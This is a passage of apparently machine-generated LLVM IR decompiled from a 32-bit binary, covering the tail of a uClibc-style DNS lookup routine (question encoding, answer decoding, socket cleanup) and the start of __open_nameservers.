  br i1 %v4_1000dcf8, label %dec_label_pc_1000dd00, label %dec_label_pc_1000df70

dec_label_pc_1000dd00:                            ; preds = %dec_label_pc_1000dce8
  store i32 %tmp37, i32* %r0.global-to-local, align 4
  br i1 %v3_1000dd04, label %dec_label_pc_1000df70, label %dec_label_pc_1000dd0c

dec_label_pc_1000dd0c:                            ; preds = %dec_label_pc_1000dd00
  store i32 %tmp36, i32* %r0.global-to-local, align 4
  br i1 %v3_1000dd10, label %dec_label_pc_1000dd18, label %dec_label_pc_1000dd80

dec_label_pc_1000dd18:                            ; preds = %dec_label_pc_1000dd0c
  %v0_1000dd18 = load i32, i32* %r17.global-to-local, align 4
  %v3_1000dd18 = icmp eq i32 %v0_1000dd18, 0
  br i1 %v3_1000dd18, label %dec_label_pc_1000dd20, label %dec_label_pc_1000dd74

dec_label_pc_1000dd20:                            ; preds = %dec_label_pc_1000dd18
  store i32 ptrtoint (i32* @global_var_100249b0.604 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_1000da7c, i32* %r28.global-to-local, align 4
  store i32 %v2_1000da7c, i32* @r3, align 4
  %v0_1000dd3c = call i32 @__pthread_return_void()
  %v0_1000dd44 = call i32 @__pthread_return_0()
  %v3_1000dd4c = load i32, i32* @global_var_10024a98.655, align 4
  store i32 %v2_1000da7c, i32* @r3, align 4
  %v1_1000dd58 = add i32 %v3_1000dd4c, -1
  store i32 %v1_1000dd58, i32* %r29.global-to-local, align 4
  %v0_1000dd5c = call i32 @__pthread_return_void()
  %v0_1000dd60 = load i32, i32* @r22, align 4
  %v2_1000dd60 = icmp slt i32 %v0_1000dd60, %v1_1000dd58
  br i1 %v2_1000dd60, label %dec_label_pc_1000dd68, label %dec_label_pc_1000dd74

dec_label_pc_1000dd68:                            ; preds = %dec_label_pc_1000dd20
  %v1_1000dd68 = add i32 %v0_1000dd60, 1
  store i32 %v1_1000dd68, i32* @r22, align 4
  %v0_1000dd6c = load i32, i32* @r20, align 4
  store i32 %v0_1000dd6c, i32* @r25, align 4
  br label %dec_label_pc_1000dfe4thread-pre-split.backedge

dec_label_pc_1000dd74:                            ; preds = %dec_label_pc_1000dd20, %dec_label_pc_1000dd18
  %v0_1000dd74 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_1000dda8

dec_label_pc_1000dd80:                            ; preds = %dec_label_pc_1000dd0c
  br i1 %v3_1000dd80, label %dec_label_pc_1000dd88, label %dec_label_pc_1000df70

dec_label_pc_1000dd88:                            ; preds = %dec_label_pc_1000dd80
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  br i1 %tmp58, label %dec_label_pc_1000dda0, label %dec_label_pc_1000dd94

dec_label_pc_1000dd94:                            ; preds = %dec_label_pc_1000dd88
  store i32 12, i32* %r28.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 12, i32* @r4, align 4
  %v0_1000ddc010 = load i32, i32* @r30, align 4
  store i32 %v0_1000ddc010, i32* @r3, align 4
  store i32 1, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000ddb0

dec_label_pc_1000dda0:                            ; preds = %dec_label_pc_1000dd88
  %v0_1000dda0 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_1000dda8

dec_label_pc_1000dda8:                            ; preds = %dec_label_pc_1000dd74, %dec_label_pc_1000dda0
  %storemerge3 = phi i32 [ %v0_1000dda0, %dec_label_pc_1000dda0 ], [ %v0_1000dd74, %dec_label_pc_1000dd74 ]
  %storemerge = phi i32 [ 4, %dec_label_pc_1000dda0 ], [ 1, %dec_label_pc_1000dd74 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v2_1000dda8 = inttoptr i32 %storemerge3 to i32*
  store i32 %storemerge, i32* %v2_1000dda8, align 4
  br label %dec_label_pc_1000e00c

dec_label_pc_1000ddb0:                            ; preds = %dec_label_pc_1000dd94, %dec_label_pc_1000ddb0
  %v0_1000ddc014 = phi i32 [ %v0_1000ddc010, %dec_label_pc_1000dd94 ], [ %v0_1000ddc0, %dec_label_pc_1000ddb0 ]
  %storemerge213 = phi i32 [ 12, %dec_label_pc_1000dd94 ], [ %v2_1000ddb4, %dec_label_pc_1000ddb0 ]
  store i32 268492212, i32* @lr, align 4
  %v2_1000ddb0 = call i32 @__length_question(i32 %v0_1000ddc014, i32 %storemerge213)
  %v0_1000ddb4 = load i32, i32* %r28.global-to-local, align 4
  %v2_1000ddb4 = add i32 %v0_1000ddb4, %v2_1000ddb0
  %v0_1000ddc4.pr = load i32, i32* %r29.global-to-local, align 4
  store i32 %v2_1000ddb4, i32* %r28.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_1000ddb4, i32* @r4, align 4
  %v0_1000ddc0 = load i32, i32* @r30, align 4
  store i32 %v0_1000ddc0, i32* @r3, align 4
  %v2_1000ddc4 = icmp slt i32 %v0_1000ddc4.pr, 1
  %v1_1000ddc8 = add i32 %v0_1000ddc4.pr, 1
  store i32 %v1_1000ddc8, i32* %r29.global-to-local, align 4
  br i1 %v2_1000ddc4, label %dec_label_pc_1000ddb0, label %dec_label_pc_1000ddd0

dec_label_pc_1000ddd0:                            ; preds = %dec_label_pc_1000ddb0
  store i32 0, i32* @r24, align 4
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  br i1 %v2_1000dd8c, label %dec_label_pc_1000df1c, label %dec_label_pc_1000df24

dec_label_pc_1000dde0:                            ; preds = %dec_label_pc_1000df1c
  store i32 %v2_1000dde0, i32* %r29.global-to-local, align 4
  %v0_1000dde4 = load i32, i32* @r30, align 4
  store i32 268492280, i32* @lr, align 4
  %v5_1000ddf4 = call i32 @__decode_answer(i32 %v0_1000dde4, i32 %v0_1000dde8, i32 %v1_1000df1c, i32* nonnull %stack_var_-184)
  store i32 %v5_1000ddf4, i32* %r15.global-to-local, align 4
  %tmp64 = icmp sgt i32 %v5_1000ddf4, -1
  br i1 %tmp64, label %dec_label_pc_1000de18, label %dec_label_pc_1000de00

dec_label_pc_1000de00:                            ; preds = %dec_label_pc_1000dde0
  %v0_1000de00 = load i32, i32* @r24, align 4
  %v3_1000de00 = icmp eq i32 %v0_1000de00, 0
  br i1 %v3_1000de00, label %dec_label_pc_1000df70, label %dec_label_pc_1000de08

dec_label_pc_1000de08:                            ; preds = %dec_label_pc_1000de00
  store i32 %tmp33, i32* %r0.global-to-local, align 4
  br i1 %v3_1000de0c, label %dec_label_pc_1000df70, label %dec_label_pc_1000df24

dec_label_pc_1000de18:                            ; preds = %dec_label_pc_1000dde0
  store i32 %stack_var_-88.118, i32* %r0.global-to-local, align 4
  %v3_1000de1c = icmp eq i32 %stack_var_-88.118, 0
  br i1 %v3_1000de1c, label %dec_label_pc_1000dec0, label %dec_label_pc_1000de24

dec_label_pc_1000de24:                            ; preds = %dec_label_pc_1000de18
  %v0_1000de24 = load i32, i32* @r31, align 4
  store i32 %v2_1000dde0, i32* @r4, align 4
  %v1_1000de2c = add i32 %v0_1000de24, 28
  %v2_1000de2c = inttoptr i32 %v1_1000de2c to i32*
  %v3_1000de2c = load i32, i32* %v2_1000de2c, align 4
  store i32 %v3_1000de2c, i32* %r0.global-to-local, align 4
  store i32 %v0_1000de24, i32* @r3, align 4
  %v1_1000de34 = add i32 %v0_1000de24, 36
  %v2_1000de34 = inttoptr i32 %v1_1000de34 to i32*
  %v3_1000de34 = load i32, i32* %v2_1000de34, align 4
  store i32 %v3_1000de34, i32* %r11.global-to-local, align 4
  store i32 40, i32* @r5, align 4
  store i32 268492364, i32* @lr, align 4
  %v0_1000de48 = call i32 @memcpy()
  %v0_1000de4c = load i32, i32* @r31, align 4
  %v1_1000de4c = add i32 %v0_1000de4c, 4
  %v2_1000de4c = inttoptr i32 %v1_1000de4c to i32*
  %v3_1000de4c = load i32, i32* %v2_1000de4c, align 4
  %v3_1000de50 = icmp eq i32 %v3_1000de4c, 24
  br i1 %v3_1000de50, label %dec_label_pc_1000de24.dec_label_pc_1000de74_crit_edge, label %dec_label_pc_1000de58

dec_label_pc_1000de24.dec_label_pc_1000de74_crit_edge: ; preds = %dec_label_pc_1000de24
  %v1_1000de74.pre = load i32, i32* %r16.global-to-local, align 4
  br label %dec_label_pc_1000de74

dec_label_pc_1000de58:                            ; preds = %dec_label_pc_1000de24
  %v1_1000de58 = add i32 %v0_1000de4c, 28
  %v2_1000de58 = inttoptr i32 %v1_1000de58 to i32*
  %v3_1000de58 = load i32, i32* %v2_1000de58, align 4
  store i32 %v3_1000de58, i32* %r0.global-to-local, align 4
  %v3_1000de5c = icmp eq i32 %v3_1000de58, 0
  br i1 %v3_1000de5c, label %dec_label_pc_1000df24, label %dec_label_pc_1000de64

dec_label_pc_1000de64:                            ; preds = %dec_label_pc_1000de58
  %v0_1000de64 = load i32, i32* %r16.global-to-local, align 4
  %v3_1000de64 = icmp eq i32 %v0_1000de64, 1
  br i1 %v3_1000de64, label %dec_label_pc_1000de74, label %dec_label_pc_1000de6c

dec_label_pc_1000de6c:                            ; preds = %dec_label_pc_1000de64
  %v3_1000de6c = icmp eq i32 %v0_1000de64, 28
  br i1 %v3_1000de6c, label %dec_label_pc_1000de74, label %dec_label_pc_1000df24

dec_label_pc_1000de74:                            ; preds = %dec_label_pc_1000de24.dec_label_pc_1000de74_crit_edge, %dec_label_pc_1000de6c, %dec_label_pc_1000de64
  %v1_1000de74 = phi i32 [ %v1_1000de74.pre, %dec_label_pc_1000de24.dec_label_pc_1000de74_crit_edge ], [ 28, %dec_label_pc_1000de6c ], [ 1, %dec_label_pc_1000de64 ]
  %v4_1000de74 = icmp eq i32 %v3_1000de4c, %v1_1000de74
  br i1 %v4_1000de74, label %dec_label_pc_1000de88, label %dec_label_pc_1000de7c

dec_label_pc_1000de7c:                            ; preds = %dec_label_pc_1000de74
  %v1_1000de7c = inttoptr i32 %v0_1000de4c to i32*
  %v2_1000de7c = load i32, i32* %v1_1000de7c, align 4
  store i32 %v2_1000de7c, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1000de84.663 to i32), i32* @lr, align 4
  %v0_1000de80 = call i32 @free()
  br label %dec_label_pc_1000df08

dec_label_pc_1000de88:                            ; preds = %dec_label_pc_1000de74
  %v1_1000de8c = add i32 %v0_1000de4c, 16
  %v2_1000de8c = inttoptr i32 %v1_1000de8c to i32*
  %v3_1000de8c = load i32, i32* %v2_1000de8c, align 4
  store i32 %v3_1000de8c, i32* %r11.global-to-local, align 4
  %v0_1000de90 = load i32, i32* @r24, align 4
  %v2_1000de90 = sub i32 %tmp35, %v0_1000de90
  %v1_1000de94 = add i32 %v0_1000de4c, 32
  %v2_1000de94 = inttoptr i32 %v1_1000de94 to i32*
  %v3_1000de94 = load i32, i32* %v2_1000de94, align 4
  store i32 %v3_1000de94, i32* %r0.global-to-local, align 4
  %v1_1000de98 = add i32 %v2_1000de90, -1
  %v1_1000de9c = add i32 %v3_1000de8c, 4
  %v2_1000dea0 = mul i32 %v1_1000de98, %v1_1000de9c
  store i32 %v2_1000dea0, i32* %r11.global-to-local, align 4
  %v2_1000dea4 = add i32 %v0_1000de4c, 36
  %v3_1000dea4 = inttoptr i32 %v2_1000dea4 to i32*
  store i32 %v1_1000de98, i32* %v3_1000dea4, align 4
  %v0_1000dea8 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000dea8 = load i32, i32* %r0.global-to-local, align 4
  %v3_1000dea8 = icmp ugt i32 %v0_1000dea8, %v1_1000dea8
  br i1 %v3_1000dea8, label %dec_label_pc_1000df24, label %dec_label_pc_1000deb0

dec_label_pc_1000deb0:                            ; preds = %dec_label_pc_1000de88
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1000deb8 = load i32, i32* @r31, align 4
  %v2_1000deb8 = add i32 %v1_1000deb8, 36
  %v3_1000deb8 = inttoptr i32 %v2_1000deb8 to i32*
  store i32 0, i32* %v3_1000deb8, align 4
  br label %dec_label_pc_1000df08

dec_label_pc_1000dec0:                            ; preds = %dec_label_pc_1000de18
  %v3_1000dec0 = load i32, i32* %stack_var_-184, align 4
  store i32 %v3_1000dec0, i32* @r3, align 4
  store i32 268492488, i32* @lr, align 4
  %v0_1000dec4 = call i32 @free()
  store i32 %tmp29, i32* %r0.global-to-local, align 4
  %v1_1000decc = load i32, i32* %r16.global-to-local, align 4
  %v4_1000decc = icmp eq i32 %tmp29, %v1_1000decc
  br i1 %v4_1000decc, label %dec_label_pc_1000ded4, label %dec_label_pc_1000df08

dec_label_pc_1000ded4:                            ; preds = %dec_label_pc_1000dec0
  %v0_1000ded4 = load i32, i32* @r31, align 4
  %v1_1000ded4 = add i32 %v0_1000ded4, 16
  %v2_1000ded4 = inttoptr i32 %v1_1000ded4 to i32*
  %v3_1000ded4 = load i32, i32* %v2_1000ded4, align 4
  store i32 %v3_1000ded4, i32* @r5, align 4
  store i32 %tmp28, i32* %r0.global-to-local, align 4
  %v4_1000dedc = icmp eq i32 %v3_1000ded4, %tmp28
  br i1 %v4_1000dedc, label %dec_label_pc_1000dee4, label %dec_label_pc_1000df68

dec_label_pc_1000dee4:                            ; preds = %dec_label_pc_1000ded4
  %v1_1000dee4 = add i32 %v0_1000ded4, 36
  %v2_1000dee4 = inttoptr i32 %v1_1000dee4 to i32*
  %v3_1000dee4 = load i32, i32* %v2_1000dee4, align 4
  %v1_1000dee8 = add i32 %v0_1000ded4, 28
  %v2_1000dee8 = inttoptr i32 %v1_1000dee8 to i32*
  %v3_1000dee8 = load i32, i32* %v2_1000dee8, align 4
  store i32 %v3_1000dee8, i32* %r0.global-to-local, align 4
  %v2_1000deec = mul i32 %v3_1000dee4, %tmp28
  %v2_1000def4 = add i32 %v3_1000dee8, %v2_1000deec
  store i32 %v2_1000def4, i32* @r3, align 4
  store i32 268492540, i32* @lr, align 4
  %v0_1000def8 = call i32 @memcpy()
  %v0_1000defc = load i32, i32* @r31, align 4
  %v1_1000defc = add i32 %v0_1000defc, 36
  %v2_1000defc = inttoptr i32 %v1_1000defc to i32*
  %v3_1000defc = load i32, i32* %v2_1000defc, align 4
  %v1_1000df00 = add i32 %v3_1000defc, 1
  store i32 %v1_1000df00, i32* %v2_1000defc, align 4
  br label %dec_label_pc_1000df08

dec_label_pc_1000df08:                            ; preds = %dec_label_pc_1000dec0, %dec_label_pc_1000deb0, %dec_label_pc_1000de7c, %dec_label_pc_1000dee4
  %stack_var_-88.0 = phi i32 [ 0, %dec_label_pc_1000dee4 ], [ 0, %dec_label_pc_1000dec0 ], [ 0, %dec_label_pc_1000deb0 ], [ %stack_var_-88.118, %dec_label_pc_1000de7c ]
  %v0_1000df08 = load i32, i32* @r28, align 4
  %v1_1000df08 = load i32, i32* %r15.global-to-local, align 4
  %v2_1000df08 = add i32 %v1_1000df08, %v0_1000df08
  store i32 %v2_1000df08, i32* %r28.global-to-local, align 4
  %v0_1000df0c = load i32, i32* @r24, align 4
  %v1_1000df0c = add i32 %v0_1000df0c, 1
  store i32 %v1_1000df0c, i32* @r24, align 4
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  %v2_1000df14 = icmp slt i32 %v1_1000df0c, %tmp35
  br i1 %v2_1000df14, label %dec_label_pc_1000df1c, label %dec_label_pc_1000df24

dec_label_pc_1000df1c:                            ; preds = %dec_label_pc_1000ddd0, %dec_label_pc_1000df08
  %v0_1000dde8 = phi i32 [ %v2_1000df08, %dec_label_pc_1000df08 ], [ %v2_1000ddb4, %dec_label_pc_1000ddd0 ]
  %stack_var_-88.118 = phi i32 [ %stack_var_-88.0, %dec_label_pc_1000df08 ], [ 1, %dec_label_pc_1000ddd0 ]
  %v1_1000df1c = load i32, i32* @r27, align 4
  %v2_1000df1c = icmp slt i32 %v0_1000dde8, %v1_1000df1c
  br i1 %v2_1000df1c, label %dec_label_pc_1000dde0, label %dec_label_pc_1000df24

dec_label_pc_1000df24:                            ; preds = %dec_label_pc_1000de08, %dec_label_pc_1000ddd0, %dec_label_pc_1000df1c, %dec_label_pc_1000de58, %dec_label_pc_1000de88, %dec_label_pc_1000df08, %dec_label_pc_1000de6c
  %v0_1000df24 = load i32, i32* @r19, align 4
  store i32 268492588, i32* @lr, align 4
  %v1_1000df28 = call i32 @__libc_close(i32 %v0_1000df24)
  %v3_1000df30 = icmp eq i32 %arg5, 0
  %v0_1000df40 = load i32, i32* @r30, align 4
  br i1 %v3_1000df30, label %dec_label_pc_1000df40, label %dec_label_pc_1000df38

dec_label_pc_1000df38:                            ; preds = %dec_label_pc_1000df24
  %v2_1000df38 = inttoptr i32 %arg5 to i32*
  store i32 %v0_1000df40, i32* %v2_1000df38, align 4
  br label %dec_label_pc_1000df48

dec_label_pc_1000df40:                            ; preds = %dec_label_pc_1000df24
  store i32 %v0_1000df40, i32* @r3, align 4
  store i32 268492616, i32* @lr, align 4
  %v0_1000df44 = call i32 @free()
  br label %dec_label_pc_1000df48

dec_label_pc_1000df48:                            ; preds = %dec_label_pc_1000df38, %dec_label_pc_1000df40
  %v0_1000df48 = load i32, i32* @r21, align 4
  store i32 %v0_1000df48, i32* @r3, align 4
  store i32 268632064, i32* %r29.global-to-local, align 4
  store i32 268492628, i32* @lr, align 4
  %v0_1000df50 = call i32 @free()
  store i32 ptrtoint (i32* @global_var_1002acd0.651 to i32), i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000e04c

dec_label_pc_1000df68:                            ; preds = %dec_label_pc_1000ded4
  %v1_1000df68 = inttoptr i32 %v0_1000ded4 to i32*
  %v2_1000df68 = load i32, i32* %v1_1000df68, align 4
  store i32 %v2_1000df68, i32* @r3, align 4
  store i32 268492656, i32* @lr, align 4
  %v0_1000df6c = call i32 @free()
  br label %dec_label_pc_1000df70

dec_label_pc_1000df70:                            ; preds = %dec_label_pc_1000dd80, %dec_label_pc_1000dce8, %dec_label_pc_1000de08, %dec_label_pc_1000de00, %dec_label_pc_1000dd00, %dec_label_pc_1000dcc8, %dec_label_pc_1000df68
  %v0_1000df70 = load i32, i32* %r17.global-to-local, align 4
  %v3_1000df70 = icmp eq i32 %v0_1000df70, 0
  br i1 %v3_1000df70, label %dec_label_pc_1000df78, label %dec_label_pc_1000dfc8

dec_label_pc_1000df78:                            ; preds = %dec_label_pc_1000df70
  store i32 ptrtoint (i32* @global_var_100249b0.604 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_1000da7c, i32* %r28.global-to-local, align 4
  store i32 %v2_1000da7c, i32* @r3, align 4
  %v0_1000df94 = call i32 @__pthread_return_void()
  %v0_1000df9c = call i32 @__pthread_return_0()
  %v3_1000dfa4 = load i32, i32* @global_var_10024a98.655, align 4
  store i32 %v2_1000da7c, i32* @r3, align 4
  %v1_1000dfb0 = add i32 %v3_1000dfa4, -1
  store i32 %v1_1000dfb0, i32* %r29.global-to-local, align 4
  %v0_1000dfb4 = call i32 @__pthread_return_void()
  %v0_1000dfb8 = load i32, i32* @r22, align 4
  %v2_1000dfb8 = icmp slt i32 %v0_1000dfb8, %v1_1000dfb0
  br i1 %v2_1000dfb8, label %dec_label_pc_1000dfc0, label %dec_label_pc_1000dfc8

dec_label_pc_1000dfc0:                            ; preds = %dec_label_pc_1000df78
  %v1_1000dfc0 = add i32 %v0_1000dfb8, 1
  store i32 %v1_1000dfc0, i32* @r22, align 4
  br label %dec_label_pc_1000dfe4thread-pre-split.backedge

dec_label_pc_1000dfe4thread-pre-split.backedge:   ; preds = %dec_label_pc_1000dfc0, %dec_label_pc_1000dd68, %dec_label_pc_1000dfe0
  %v0_1000dfe4.pr = load i32, i32* %r18.global-to-local, align 4
  %tmp65 = icmp ult i32 %v0_1000dfe4.pr, 3
  br i1 %tmp65, label %dec_label_pc_1000dad8.lr.ph, label %dec_label_pc_1000dffc

dec_label_pc_1000dfc8:                            ; preds = %dec_label_pc_1000dc78, %dec_label_pc_1000df78, %dec_label_pc_1000df70, %dec_label_pc_1000dc90
  %v0_1000dfc8 = load i32, i32* @r26, align 4
  %v1_1000dfc8 = add i32 %v0_1000dfc8, 1
  store i32 %v1_1000dfc8, i32* %r0.global-to-local, align 4
  %v1_1000dfcc = load i32, i32* @r23, align 4
  %v2_1000dfcc = srem i32 %v1_1000dfc8, %v1_1000dfcc
  store i32 %v2_1000dfcc, i32* @r26, align 4
  %v5_1000dfd4 = icmp eq i32 %v2_1000dfcc, 0
  br i1 %v5_1000dfd4, label %dec_label_pc_1000dfdc, label %dec_label_pc_1000dfe0

dec_label_pc_1000dfdc:                            ; preds = %dec_label_pc_1000dfc8
  %v0_1000dfdc = load i32, i32* %r18.global-to-local, align 4
  %v1_1000dfdc = add i32 %v0_1000dfdc, 1
  store i32 %v1_1000dfdc, i32* %r18.global-to-local, align 4
  br label %dec_label_pc_1000dfe0

dec_label_pc_1000dfe0:                            ; preds = %dec_label_pc_1000dfc8, %dec_label_pc_1000dfdc
  store i32 -1, i32* @r22, align 4
  br label %dec_label_pc_1000dfe4thread-pre-split.backedge

dec_label_pc_1000dad8.lr.ph:                      ; preds = %dec_label_pc_1000dad8.lr.ph.lr.ph, %dec_label_pc_1000dfe4thread-pre-split.backedge
  br label %dec_label_pc_1000dad8

dec_label_pc_1000dff0:                            ; preds = %dec_label_pc_1000da50, %dec_label_pc_1000da48, %dec_label_pc_1000da40, %entry
  store i32 -1, i32* @r19, align 4
  store i32 -1, i32* @r26, align 4
  store i32 -1, i32* @r25, align 4
  br label %dec_label_pc_1000dffc

dec_label_pc_1000dffc:                            ; preds = %dec_label_pc_1000dfe4thread-pre-split.backedge, %dec_label_pc_1000dae8, %dec_label_pc_1000dbc4, %dec_label_pc_1000dc88, %dec_label_pc_1000da5c, %dec_label_pc_1000dff0
  %v0_1000dffc = call i32 @__GI___h_errno_location()
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1000e004 = inttoptr i32 %v0_1000dffc to i32*
  store i32 -1, i32* %v2_1000e004, align 4
  %v0_1000e008 = load i32, i32* @r25, align 4
  store i32 %v0_1000e008, i32* @r20, align 4
  br label %dec_label_pc_1000e00c

dec_label_pc_1000e00c:                            ; preds = %dec_label_pc_1000dda8, %dec_label_pc_1000dffc
  %v0_1000e00c = load i32, i32* @r19, align 4
  %v3_1000e00c = icmp eq i32 %v0_1000e00c, -1
  br i1 %v3_1000e00c, label %dec_label_pc_1000e01c, label %dec_label_pc_1000e014

dec_label_pc_1000e014:                            ; preds = %dec_label_pc_1000e00c
  store i32 268492828, i32* @lr, align 4
  %v1_1000e018 = call i32 @__libc_close(i32 %v0_1000e00c)
  br label %dec_label_pc_1000e01c

dec_label_pc_1000e01c:                            ; preds = %dec_label_pc_1000e00c, %dec_label_pc_1000e014
  %v0_1000e01c = load i32, i32* @r21, align 4
  store i32 %v0_1000e01c, i32* @r3, align 4
  store i32 -1, i32* @r27, align 4
  store i32 268492840, i32* @lr, align 4
  %v0_1000e024 = call i32 @free()
  %v0_1000e028 = load i32, i32* @r30, align 4
  store i32 %v0_1000e028, i32* @r3, align 4
  store i32 268492848, i32* @lr, align 4
  %v0_1000e02c = call i32 @free()
  %v0_1000e030 = load i32, i32* @r26, align 4
  %v3_1000e030 = icmp eq i32 %v0_1000e030, -1
  br i1 %v3_1000e030, label %dec_label_pc_1000e07c, label %dec_label_pc_1000e038

dec_label_pc_1000e038:                            ; preds = %dec_label_pc_1000e01c
  store i32 ptrtoint (i32* @global_var_1002acd0.651 to i32), i32* %r29.global-to-local, align 4
  %v2_1000e044 = ptrtoint i32* %stack_var_-228 to i32
  br label %dec_label_pc_1000e04c

dec_label_pc_1000e04c:                            ; preds = %dec_label_pc_1000df48, %dec_label_pc_1000e038
  %storemerge68 = phi i32 [ %v2_1000e044, %dec_label_pc_1000e038 ], [ %v2_1000da7c, %dec_label_pc_1000df48 ]
  %v1_1000e050.pre-phi = phi i32 [ %v2_1000e044, %dec_label_pc_1000e038 ], [ %v2_1000da7c, %dec_label_pc_1000df48 ]
  store i32 %storemerge68, i32* %r28.global-to-local, align 4
  store i32 %v1_1000e050.pre-phi, i32* @r3, align 4
  %v0_1000e054 = call i32 @__pthread_return_void()
  %v0_1000e05c = call i32 @__pthread_return_0()
  %v0_1000e064 = load i32, i32* @r26, align 4
  store i32 %v0_1000e064, i32* @global_var_10024a90.652, align 4
  store i32 %v1_1000e050.pre-phi, i32* @r3, align 4
  %v0_1000e074 = load i32, i32* @r20, align 4
  %v1_1000e074 = trunc i32 %v0_1000e074 to i16
  store i16 %v1_1000e074, i16* @global_var_100249ac.653, align 2
  %v0_1000e078 = call i32 @__pthread_return_void()
  br label %dec_label_pc_1000e07c

dec_label_pc_1000e07c:                            ; preds = %dec_label_pc_1000e01c, %dec_label_pc_1000e04c
  store i32 %v0_1000d9fc, i32* %r0.global-to-local, align 4
  %v0_1000e080 = load i32, i32* @r27, align 4
  ret i32 %v0_1000e080

; uselistorder directives
  uselistorder i32 %v1_1000e050.pre-phi, { 1, 0 }
  uselistorder i32 %v2_1000dfcc, { 1, 0 }
  uselistorder i32 %v0_1000df40, { 1, 0 }
  uselistorder i32 %v1_1000df1c, { 1, 0 }
  uselistorder i32 %stack_var_-88.118, { 1, 0, 2 }
  uselistorder i32 %v0_1000dde8, { 1, 0 }
  uselistorder i32 %v1_1000df0c, { 1, 0 }
  uselistorder i32 %v0_1000ded4, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1000de98, { 1, 0 }
  uselistorder i32 %v0_1000de24, { 2, 1, 0 }
  uselistorder i32 %v0_1000ddc0, { 1, 0 }
  uselistorder i32 %v2_1000ddb4, { 0, 2, 1, 3 }
  uselistorder i32 %v4_1000dcd8, { 1, 0 }
  uselistorder i32 %v1_1000dbd8, { 1, 0 }
  uselistorder i32 %v1_1000dbac, { 1, 0 }
  uselistorder i32 %v1_1000db78, { 1, 0 }
  uselistorder i32 %v1_1000db10, { 1, 0 }
  uselistorder i32 %v2_1000da7c, { 0, 1, 5, 6, 7, 2, 3, 4, 8, 9, 10, 11, 12 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2, 3 }
  uselistorder i16* %stack_var_-212, { 0, 1, 4, 3, 2 }
  uselistorder i32* %stack_var_-184, { 1, 0, 2 }
  uselistorder i32 %tmp36, { 1, 0, 2 }
  uselistorder i32 %tmp35, { 6, 5, 0, 1, 2, 4, 3 }
  uselistorder i32 %tmp29, { 1, 0 }
  uselistorder i32 %tmp28, { 0, 2, 1 }
  uselistorder i32* %r29.global-to-local, { 1, 2, 3, 4, 5, 6, 8, 7, 0, 9, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32* %r28.global-to-local, { 0, 2, 3, 5, 4, 1, 6, 7, 8, 9 }
  uselistorder i32* %r18.global-to-local, { 0, 2, 5, 1, 3, 4, 6 }
  uselistorder i32* %r17.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r16.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 5, 16, 6, 7, 8, 11, 9, 10, 12, 13, 14, 15, 2, 17, 0, 1, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 4, 5, 3, 2, 1, 0 }
  uselistorder i32 101, { 2, 0, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 2, 4, 3, 5, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 0, 7, 6, 5, 4, 3, 2, 8, 1 }
  uselistorder i32 17, { 2, 3, 12, 4, 9, 10, 5, 11, 6, 16, 17, 13, 14, 15, 0, 1, 7, 8 }
  uselistorder i32 (i32)* @inet_addr, { 0, 3, 2, 1 }
  uselistorder i32 53, { 2, 0, 1 }
  uselistorder i16 10, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @strncpy, { 0, 2, 1, 3 }
  uselistorder i32 (i32)* @__libc_close, { 13, 12, 9, 14, 19, 18, 17, 16, 15, 11, 10, 0, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i16* @global_var_100249ac.653, { 1, 0 }
  uselistorder i32 1025, { 2, 3, 1, 7, 0, 4, 5, 6 }
  uselistorder i32 512, { 2, 6, 0, 1, 7, 3, 4, 5 }
  uselistorder label %dec_label_pc_1000e07c, { 1, 0 }
  uselistorder label %dec_label_pc_1000e04c, { 1, 0 }
  uselistorder label %dec_label_pc_1000e01c, { 1, 0 }
  uselistorder label %dec_label_pc_1000e00c, { 1, 0 }
  uselistorder label %dec_label_pc_1000dffc, { 5, 0, 3, 2, 1, 4 }
  uselistorder label %dec_label_pc_1000dad8.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_1000dfe0, { 1, 0 }
  uselistorder label %dec_label_pc_1000dfc8, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_1000dfe4thread-pre-split.backedge, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000df70, { 6, 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_1000df48, { 1, 0 }
  uselistorder label %dec_label_pc_1000df24, { 2, 5, 4, 6, 3, 0, 1 }
  uselistorder label %dec_label_pc_1000df1c, { 1, 0 }
  uselistorder label %dec_label_pc_1000df08, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000de74, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000ddb0, { 1, 0 }
  uselistorder label %dec_label_pc_1000dda8, { 1, 0 }
  uselistorder label %dec_label_pc_1000dc4c, { 1, 0 }
  uselistorder label %dec_label_pc_1000dbc4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000dae8, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
